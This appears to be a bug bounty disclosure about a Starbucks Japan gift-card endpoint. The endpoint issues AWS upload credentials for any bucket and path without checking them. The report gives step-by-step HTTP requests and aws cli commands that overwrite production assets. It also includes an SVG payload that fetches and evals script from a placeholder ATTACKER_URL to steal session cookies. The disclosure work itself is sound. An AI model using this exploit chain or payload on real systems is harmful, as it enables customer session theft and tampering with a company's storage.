---
attachments: [Screenshot 2025-02-03 at 2.23.15 AM.png]
title: 'Stored XSS: Misconfigured endpoint allows generation of AWS creds for arbitrary file upload to user-specified S3 bucket and path'
created: '2025-02-02T15:19:04.993Z'
modified: '2025-02-03T05:18:21.145Z'
---

# Stored XSS: Misconfigured endpoint allows generation of AWS creds for arbitrary file upload to user-specified S3 bucket and path

## Starbucks Japan 03/02/2025

## Summary:
- This vulnerability allows unauthenticated users to generate temporary AWS creds for arbitrary file upload to user-specified S3 bucket and path
- Existing assets at gift.starbucks.co.jp can be overwritten by the user and replaced with malicious files to engage a stored XSS attack against any customers visiting the site, for example, retrieving session IDs and other cookies to perform actions on behalf of other customers and/or accessing sensitive data (e.g. credit card info)
- Malicious files could also be uploaded to strategic bucket/filepath locations in the hopes of company employees/engineers with S3 access accidentally downloading and/or executing them
- The gift card service can also be interrupted by replacing the assets with empty/invalid files or otherwise offensive material

## Steps To Reproduce:
- Any unauthenticated user can navigate to https://www.starbucks.co.jp/group_egift/ and hit the `寄せ書きをつくる` button to generate a new group gift.

- The user can then select the option to upload their own image for the card design.

- This reveals the `/upload_token` endpoint as a POST request is fired off with a payload containing a hardcoded bucket `prd-sbj-egift-user-images-draft` and generated filepath (based off the group gift ID, I think), similar to the one below. This request only requires the `_session_id` cookie and `X-Csrf-Token` header which is why this can be leveraged without being logged into an account.

```
POST /upload_token HTTP/2
Host: gift.starbucks.co.jp
Cookie: _session_id=2970947...;
Content-Type: application/json;charset=utf-8
X-Csrf-Token: T1ZpeY+3eDlS2...

{
  "bucket_name": "prd-sbj-egift-user-images-draft",
  "filepath":"send_to/send_to-1738510879046....jpeg"
}
```

- The response contains the generated temporary AWS credentials with appropriate permissions to upload the image file to the specified bucket and path (obviously these creds have been truncated and are no longer valid).

```json
{
  "access_key_id":"ASIAXORN27VLT35SFYDM",
  "secret_access_key":"FBYwhuhZoxay4kZ...",
  "session_token":"IQoJb3JpZ2luX2VjEOj...",
  "upload_file_name":"send_to/send_to-1738510879046...jpeg"
}
```

- The bucket name and filepath parameters are seemingly not checked at all, making it possible to generate upload creds for any bucket and location that we choose. We can demonstrate this by replaying the upload token request and modifying the body as below.

```json
{
  "bucket_name": "prd-sbj-egift-user-images-draft",
  "filepath": "kryn3n/hacked.txt"
}
```

- Now lets see if we can use our AWS credentials to get authenticated on the command line. First we can export our creds and run a simple `whoami`.

```bash
export AWS_ACCESS_KEY_ID=ASIAXORN27VLT35SFYDM
export AWS_SECRET_ACCESS_KEY=FBYwhuhZoxay4kZ...
export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEOj...

aws whoami
```

- Looks like we're authenticated as `sbj-egift-web`, nice!

```json
{
    "UserId": "512270990679:sbj-egift-web",
    "Account": "512270990679",
    "Arn": "arn:aws:sts::512270990679:federated-user/sbj-egift-web"
}
```

- Now lets upload our "malicious" 😉🏴‍☠️ file to the path we specified in our upload token request using the aws cli.

```bash
aws s3api put-object \
  --bucket "prd-sbj-egift-user-images-draft" \
  --key "hackerone/kryn3n/hacked.txt" \
  --body ./hacked.txt
```
- Looks like the file was uploaded without any complaints.
```json
{
    "Expiration": "expiry-date=\"Sat, 15 Mar 2025 00:00:00 GMT\", rule-id=\"user-upload-images-lifecycle-rule\"",
    "ETag": "\"9226b53bfe04b2aae262a6fdf26e9af5\"",
    "ServerSideEncryption": "AES256",
    "VersionId": "zDiSGKrV7v3h1NT_fPzfJLQVS3tNMJ3i"
}
```

- Let's see if we can curl our new file down.

```bash
curl prd-sbj-egift-user-images-draft.s3-ap-northeast-1.amazonaws.com/hackerone/kryn3n/hacked.txt \
  -H "Referer:https://gift.starbucks.co.jp/" 
````
```
you've been hacked :) [kryn3n@wearehackerone.com]
```

- Great success! Let's see if there are any other existing buckets that we can target... Poking around a bit more, we can see another hardcoded bucket `e-gifts.s3.ap-northeast-1.amazonaws.com` which seems to hold all of the gift card design assets.
- Following the same procedure, we are able to request an upload token for this new bucket and a filepath matching an existing asset using the payload below.

```json
{
  "bucket_name": "e-gifts",
  "filepath": "eg_cover_design_assets/touka_intro_cheers_2/celebrate02_select_thumb-120x160.gif"
}
```
- Exporting the new credentials, we can perform another `put-object` to overwrite the existing asset.

```bash
aws s3api put-object \
  --bucket "e-gifts" \
  --key "eg_cover_design_assets/touka_intro_cheers_2/celebrate02_select_thumb-120x160.gif" \
  --body ./laptop_cat.gif
```

- Again, the file is uploaded without an issue and successfully overwrites the existing asset.
```json
{
    "ETag": "\"09a5bc4683984718afe9688bdecc9ce2\"",
    "ServerSideEncryption": "AES256"
}
```

## Impact

## Summary:
- This is obviously a security risk as the gift card assets are loaded by anyone visiting the group gift creation page, which presents the opportunity of a stored XSS attack. With the ability to overwrite any of these assets with our own files we could potentially cause a script to run in another customer's browser/app to steal their session ID cookie and use that to perform actions against their account. 

- An example of this could be overwriting one of the assets with a XML/SVG image containing an embedded malicious script as shown below. This way customers would not notice anything out of the ordinary when visiting the site as we could repurpose an existing SVG asset.

```xml
<xml>
    <text>
        hello
        <img
            src="1"
            onerror="fetch('ATTACKER_URL/script.js').then((a) => a.text().then((b) => eval(b)))"
            xmlns="http://www.w3.org/1999/xhtml"
        />
    </text>
</xml>
```

- Aside from the above, there is also the potential to generally disrupt the service by overwriting all assets with invalid or empty files and/or display offensive imagery, etc.
